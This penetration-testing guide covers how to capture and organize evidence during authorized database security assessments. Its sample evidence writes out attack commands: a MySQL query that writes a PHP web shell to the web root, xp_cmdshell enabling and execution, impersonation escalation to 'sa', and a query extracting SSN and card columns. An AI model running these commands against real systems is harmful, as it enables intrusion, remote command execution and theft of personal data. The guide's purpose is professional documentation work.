# Database Evidence Collection Guide

Systematic approach to capturing, organizing, and documenting evidence during database penetration testing. Proper evidence collection is critical for report writing and demonstrating impact to stakeholders.

Related: [[DB-02-Technical-Testing-Checklist]] | [[DB-03-Query-Tracker]] | [[DB-05-Reporting-Template]]

---

## Evidence Collection Principles

### Why Evidence Matters
- **Proof of concept** - Demonstrates vulnerability exists
- **Reproducibility** - Allows client to verify and fix
- **Legal protection** - Documents authorized testing
- **Report quality** - Visual evidence > walls of text
- **Stakeholder communication** - Executives understand screenshots

### What to Capture
- **Before state** - Normal configuration/permissions
- **Attack query** - Exact SQL command sent
- **After state** - Exploited behavior/data accessed
- **Context** - Server, database, user account, timestamp
- **Impact** - What data was accessed, what action occurred

### Quality Standards
- Screenshots must be **readable** (adequate font size)
- Include **full context** (server name, database, user visible)
- Show **complete queries and results**
- Capture **error messages** verbatim
- Document **exact steps** to reproduce

---

## File Naming Convention

**Format**: `[EngagementID]_[Category]_[FindingID]_[SequenceNumber]_[Description].png`

**Examples**:
- `ACME_Discovery_F001_01_Nmap-Scan.png`
- `ACME_Auth_F002_01_Default-SA-Login.png`
- `ACME_PrivEsc_F005_01_Impersonate-SA.png`
- `ACME_CmdExec_F007_01_Whoami-Output.png`
- `ACME_DataExfil_F010_01_Users-Table.png`

---

## Screenshot Checklist

### Every Screenshot Should Include

- [ ] **Server/instance name** visible
- [ ] **Database name** visible (if applicable)
- [ ] **Current user** shown (SELECT SYSTEM_USER or equivalent)
- [ ] **Query executed** (full SQL statement)
- [ ] **Query result** (complete output)
- [ ] **Timestamp** (visible in terminal/tool)
- [ ] **Tool used** (sqsh, mysql, psql, etc.)
- [ ] **Readable text** (zoom if needed)

---

## Evidence Categories

### Discovery & Enumeration

**Purpose**: Document discovered database services

**Captures**:
- [ ] Nmap scan results
- [ ] NSE script output (ms-sql-info, mysql-info, etc.)
- [ ] Banner grabbing output
- [ ] Version detection results
- [ ] List of discovered instances

**Naming**: `[Engagement]_Discovery_[Sequence]_[Description].png`

**Example**:
```
ACME_Discovery_01_Nmap-Port-Scan.png
ACME_Discovery_02_MSSQL-Version-Detection.png
ACME_Discovery_03_MySQL-Banner.png
```

---

### Authentication Testing

**Purpose**: Document authentication successes and failures

**Captures**:
- [ ] Default credential attempt (successful)
- [ ] Brute force output (Hydra, Medusa)
- [ ] Login prompt showing username
- [ ] Successful connection message
- [ ] Authentication error (for comparison)

**Critical Details**:
- Show username and password used
- Show connection string
- Timestamp of successful authentication
- Client/tool output

**Naming**: `[Engagement]_Auth_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Auth_F002_01_SA-Blank-Password-Login.png
ACME_Auth_F002_02_SQSH-Connected.png
ACME_Auth_F003_01_MySQL-Root-Root-Login.png
ACME_Auth_F004_01_Hydra-Brute-Force-Success.png
```

---

### Configuration Review

**Purpose**: Document dangerous misconfigurations

**Captures**:
- [ ] xp_cmdshell enabled (MSSQL)
- [ ] secure_file_priv empty (MySQL)
- [ ] Linked server configuration
- [ ] User privilege listings
- [ ] Dangerous extended procedures
- [ ] Trusted languages (PostgreSQL)

**Critical Details**:
- Show configuration query
- Show configuration value
- Highlight dangerous settings

**Naming**: `[Engagement]_Config_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Config_F005_01_XPCmdshell-Enabled.png
ACME_Config_F005_02_Linked-Servers-List.png
ACME_Config_F006_01_MySQL-Secure-File-Priv-Empty.png
ACME_Config_F007_01_PostgreSQL-Superusers.png
```

**Sample Screenshot Content**:
```sql
-- Query shown in screenshot
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Result shown in screenshot
value
-----
1

-- Note: 1 = enabled (vulnerable)
```

---

### Privilege Escalation

**Purpose**: Document privilege escalation paths

**Captures**:
- [ ] **Before**: Low-privilege user query
- [ ] **Escalation**: SQL command to escalate
- [ ] **After**: High-privilege verification
- [ ] **Impact**: Admin actions performed

**Critical Details**:
- Show original permission level
- Show escalation technique (IMPERSONATE, GRANT, etc.)
- Demonstrate new permission level
- Show what can now be accessed

**Naming**: `[Engagement]_PrivEsc_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_PrivEsc_F010_01_Original-User-Lowpriv.png
ACME_PrivEsc_F010_02_Impersonate-SA-Query.png
ACME_PrivEsc_F010_03_Now-Running-As-SA.png
ACME_PrivEsc_F010_04_Sysadmin-Verified.png
```

**Sample Screenshot Sequence**:
```sql
-- Screenshot 1: Before
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- Result: lowpriv, 0

-- Screenshot 2: Escalation
EXECUTE AS LOGIN = 'sa';

-- Screenshot 3: After
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- Result: sa, 1

-- Screenshot 4: Impact
EXEC xp_cmdshell 'whoami';
-- Now able to execute OS commands
```

---

### Command Execution

**Purpose**: Prove OS command execution capability

**Captures**:
- [ ] Enable command execution (if needed)
- [ ] Command execution query
- [ ] Command output
- [ ] Multiple commands (whoami, hostname, ipconfig)
- [ ] Advanced exploitation (reverse shell)

**Critical Details**:
- Show exact command syntax
- Capture full output
- Show service account context
- Demonstrate impact severity

**Naming**: `[Engagement]_CmdExec_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_CmdExec_F015_01_Enable-XP-Cmdshell.png
ACME_CmdExec_F015_02_Whoami-Command.png
ACME_CmdExec_F015_03_Hostname-Output.png
ACME_CmdExec_F015_04_Reverse-Shell-Received.png
```

---

### File Operations

**Purpose**: Document file read/write capabilities

**Captures**:
- [ ] File read query
- [ ] File contents displayed
- [ ] File write query
- [ ] File write verification
- [ ] Web shell upload and access

**Critical Details**:
- Show file path
- Show file contents (or excerpt)
- For web shells: show both upload and execution

**Naming**: `[Engagement]_FileOps_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_FileOps_F020_01_Read-Etc-Passwd.png
ACME_FileOps_F020_02_File-Contents.png
ACME_FileOps_F021_01_Write-Web-Shell.png
ACME_FileOps_F021_02_Shell-Access-Browser.png
```

**Sample Web Shell Evidence**:
```sql
-- Screenshot 1: Write shell
SELECT '<?php system($_GET["c"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- Screenshot 2: Verify write
SELECT LOAD_FILE('/var/www/html/shell.php');
-- Shows: <?php system($_GET["c"]); ?>

-- Screenshot 3: Browser accessing shell
URL: http://target.com/shell.php?c=whoami
Output: www-data
```

---

### Hash Extraction

**Purpose**: Document credential extraction

**Captures**:
- [ ] Hash extraction query
- [ ] Hash dump (redacted if real data)
- [ ] Hashcat cracking attempt
- [ ] Cracked passwords
- [ ] Password reuse testing

**Critical Details**:
- Show hash format
- Redact actual hashes in final report if sensitive
- Show cracking success rate
- Demonstrate impact of weak passwords

**Naming**: `[Engagement]_HashExtract_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_HashExtract_F025_01_MSSQL-Hash-Query.png
ACME_HashExtract_F025_02_Hash-Dump-REDACTED.png
ACME_HashExtract_F025_03_Hashcat-Cracking.png
ACME_HashExtract_F025_04_Cracked-Passwords.png
```

**IMPORTANT**: Always redact real hashes/passwords in evidence!

---

### Data Exfiltration

**Purpose**: Prove sensitive data disclosure

**Captures**:
- [ ] Query to access sensitive data
- [ ] Data result set (redacted if real PII)
- [ ] Row count
- [ ] Export command
- [ ] Exported file

**Critical Details**:
- Show table/column names
- Show data volume (row count)
- Redact actual PII/PHI/PCI data
- Demonstrate scope of exposure

**Naming**: `[Engagement]_DataExfil_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_DataExfil_F030_01_Users-Table-Query.png
ACME_DataExfil_F030_02_PII-Exposed-REDACTED.png
ACME_DataExfil_F030_03_Export-Command.png
ACME_DataExfil_F030_04_CSV-File-Created.png
```

**Sample Evidence**:
```sql
-- Screenshot 1: Query
SELECT username, email, ssn, credit_card 
FROM users 
WHERE active = 1;

-- Screenshot 2: Result (redacted)
username    email                ssn          credit_card
---------   -------------------- ------------ ----------------
admin       admin@company.com    ###-##-1234  ####-####-####-5678
john        john@company.com     ###-##-5678  ####-####-####-9012
... (1,247 rows total)

-- Note in evidence: "PII redacted for report. Full data available if needed."
```

---

### Lateral Movement

**Purpose**: Document movement to other systems

**Captures**:
- [ ] Linked server discovery
- [ ] Linked server query execution
- [ ] Linked server command execution
- [ ] SMB hash capture (Responder output)
- [ ] Hash cracking
- [ ] Access to additional systems

**Critical Details**:
- Show server chain (Server1 → Server2 → Server3)
- Show successful remote execution
- Capture credential theft
- Demonstrate scope of compromise

**Naming**: `[Engagement]_Lateral_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Lateral_F035_01_Linked-Servers-Found.png
ACME_Lateral_F035_02_Remote-Query-Server2.png
ACME_Lateral_F035_03_Remote-Command-Exec.png
ACME_Lateral_F036_01_Responder-Hash-Capture.png
ACME_Lateral_F036_02_Hash-Cracked.png
```

---

### Persistence Mechanisms

**Purpose**: Document backdoor creation

**Captures**:
- [ ] Backdoor account creation
- [ ] SQL Agent job creation
- [ ] Trigger creation
- [ ] Startup procedure configuration
- [ ] Persistence verification

**Critical Details**:
- Show exact SQL for backdoor
- Demonstrate persistence survives reboot/logout
- Show how to trigger backdoor

**Naming**: `[Engagement]_Persistence_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Persistence_F040_01_Create-Backdoor-Account.png
ACME_Persistence_F040_02_Add-To-Sysadmin.png
ACME_Persistence_F041_01_SQL-Agent-Job.png
ACME_Persistence_F041_02_Job-Schedule.png
```

---

## Tool Output

### Nmap Output

**Save as text**:
```bash
nmap -p 1433,3306,5432 192.168.1.0/24 -oA scan_results
# Saves: scan_results.nmap, scan_results.gnmap, scan_results.xml
```

**Screenshot**: Terminal showing scan results

**Naming**: `[Engagement]_Nmap_[Date]_[Description].png`

---

### Metasploit Output

**Screenshot**:
- Module selection
- Options set
- Execution output
- Successful exploitation message

**Save session info**:
```bash
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > sysinfo
```

**Naming**: `[Engagement]_Metasploit_F[###]_[Description].png`

---

### Hydra/Medusa Output

**Screenshot**:
- Command line arguments
- Progress output
- Successful credentials found
- Final summary

**Naming**: `[Engagement]_Brute_F[###]_[Tool]_[Description].png`

**Example**:
```
ACME_Brute_F004_Hydra_Success.png
ACME_Brute_F004_Medusa_Results.png
```

---

### SQLMap Output

If testing via SQL injection:

**Screenshot**:
- Detection output
- Injection point identified
- Database enumeration
- Data extraction

**Save output**:
```bash
sqlmap -u "http://target.com?id=1" --batch > sqlmap_output.txt
```

---

## Query Documentation

### Save All Queries

**Format**: Text file with timestamp and result

**File**: `queries_[date].sql`

```sql
-- [2026-01-22 14:30:15] Query: Check xp_cmdshell
-- User: sa
-- Database: master
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
-- Result: 1 (enabled)
-- Finding: F005

-- [2026-01-22 14:35:22] Query: Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
-- Result: Success
-- Finding: F015

-- [2026-01-22 14:36:45] Query: Execute whoami
EXEC xp_cmdshell 'whoami';
-- Result: NT SERVICE\MSSQLSERVER
-- Finding: F015
```

---

## Evidence Organization

### Directory Structure

```
[Engagement-Name]-Evidence/
├── 01-Discovery/
│   ├── ACME_Discovery_01_Nmap-Scan.png
│   ├── ACME_Discovery_02_MSSQL-Version.png
│   └── nmap_scan_results.xml
├── 02-Findings/
│   ├── F002-Default-Credentials/
│   │   ├── ACME_Auth_F002_01_SA-Login.png
│   │   ├── ACME_Auth_F002_02_Connected.png
│   │   └── finding_notes.txt
│   ├── F005-XP-Cmdshell/
│   │   ├── ACME_Config_F005_01_Enabled.png
│   │   └── ACME_CmdExec_F005_02_Whoami.png
│   ├── F010-Privilege-Escalation/
│   │   ├── screenshots...
│   │   └── privilege_escalation_chain.sql
│   └── F030-Data-Exfiltration/
│       ├── screenshots...
│       └── exported_data_REDACTED.csv
├── 03-Queries/
│   ├── all_queries_2026-01-22.sql
│   ├── successful_exploits.sql
│   └── configuration_checks.sql
├── 04-Tool-Output/
│   ├── nmap_results/
│   ├── metasploit_sessions.txt
│   ├── hydra_output.txt
│   └── hashcat_results.txt
├── 05-Hashes/
│   ├── mssql_hashes_REDACTED.txt
│   ├── mysql_hashes_REDACTED.txt
│   └── cracked_passwords_REDACTED.txt
└── 06-Notes/
    ├── DB-03-Query-Tracker.md
    └── testing-notes.txt
```

---

## Evidence Tracking Table

| Finding ID | Finding Name | Evidence Type | Filename(s) | Date Captured | QT Reference |
|-----------|-------------|--------------|-------------|---------------|-------------|
| F002 | Default SA Password | Screenshots (2) | ACME_Auth_F002_*.png | 2026-01-22 | QT-101 |
| F005 | xp_cmdshell Enabled | Screenshots (2) + Query | ACME_Config_F005_*.png | 2026-01-22 | QT-201 |
| F010 | Impersonation to SA | Screenshots (4) + Query | ACME_PrivEsc_F010_*.png | 2026-01-22 | QT-401 |
| F015 | OS Command Execution | Screenshots (3) | ACME_CmdExec_F015_*.png | 2026-01-22 | QT-501 |
| F030 | PII Exfiltration | Screenshots (3) + CSV | ACME_DataExfil_F030_* | 2026-01-22 | QT-1001 |
| | | | | | |

---

## Evidence Quality Checklist

Before finalizing evidence collection:

### Completeness
- [ ] Every finding has 2-3 screenshots minimum
- [ ] Critical findings have query documentation
- [ ] Tool output saved (Nmap, Metasploit, etc.)
- [ ] All SQL queries saved with results
- [ ] All evidence named consistently
- [ ] Directory structure organized

### Quality
- [ ] All text is readable (adequate zoom)
- [ ] Context is clear (server, database, user visible)
- [ ] Before/after states captured for escalations
- [ ] No extraneous desktop clutter
- [ ] Sensitive data redacted appropriately (test data preferred)

### Documentation
- [ ] Evidence tracking table populated
- [ ] Each file referenced in [[DB-03-Query-Tracker]]
- [ ] Findings mapped to evidence in [[DB-05-Reporting-Template]]
- [ ] Testing timeline documented
- [ ] All credentials documented (for secure storage)

---

## Tools for Evidence Collection

### Screenshot Tools
- **Windows**: Snipping Tool, ShareX, Greenshot
- **Linux**: Flameshot, Spectacle, GNOME Screenshot
- **macOS**: Command+Shift+4, Skitch
- **Terminal**: script command (records session)

### Session Recording
```bash
# Record entire terminal session
script -a session_log.txt

# Your commands here...

# Exit to stop recording
exit
```

### Query Logging

**MSSQL**:
```sql
-- Enable query logging
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'default trace enabled', 1;
RECONFIGURE;
```

**MySQL**:
```sql
-- Enable general log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';
```

**PostgreSQL**:
```bash
# Edit postgresql.conf
log_statement = 'all'
```

---

## Tips for High-Quality Evidence

### Do
✅ Capture full terminal window with context
✅ Use high resolution (text must be readable)
✅ Number sequences for multi-step attacks
✅ Save query output to files when large
✅ Test reproducibility before finalizing
✅ Keep raw screenshots (don't over-annotate)

### Don't
❌ Crop out server names or context
❌ Use tiny font sizes
❌ Mix evidence from different findings
❌ Forget to redact real credentials/hashes
❌ Leave backdoors in place post-test
❌ Assume you'll remember details later (document NOW)

---

## Evidence Handoff Checklist

Before delivering evidence to client:

- [ ] All evidence organized per directory structure
- [ ] Sensitive data redacted (PII, credentials, hashes)
- [ ] Evidence tracking table complete
- [ ] All queries documented with comments
- [ ] Tool output included
- [ ] README.txt with instructions
- [ ] No active backdoors remain
- [ ] Evidence package encrypted (7z with password)
- [ ] Password delivered via separate channel
- [ ] Client confirms receipt

---

## Security Considerations

### Handling Sensitive Data

**During Testing**:
- Use test accounts where possible
- Minimize extraction of real PII/PHI/PCI data
- If real data accessed, note in findings but don't store

**In Evidence**:
- Redact actual credentials (show "REDACTED")
- Redact actual hashes (show format only)
- Redact PII (show column names and row count, not actual data)
- Use test data examples when possible

**Example Redaction**:
```
Original:
admin:$1$abc123$xyz789:admin@company.com:123-45-6789

Redacted:
admin:[HASH_REDACTED]:admin@company.com:[SSN_REDACTED]

or

admin:$1$[REDACTED]:[EMAIL_REDACTED]:[SSN_REDACTED]
```

### Cleanup Verification

Before finalizing:
- [ ] All backdoor accounts deleted
- [ ] All SQL Agent jobs removed
- [ ] All triggers removed
- [ ] All test data cleaned
- [ ] Original configurations restored (if modified)
- [ ] Verify no persistent access remains

---

## Tags
#evidence #screenshots #documentation #database-testing #queries

---

## Related Documents
- [[DB-00-Overview|Overview]]
- [[DB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[DB-03-Query-Tracker|Query Tracker]]
- [[DB-05-Reporting-Template|Reporting Template]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
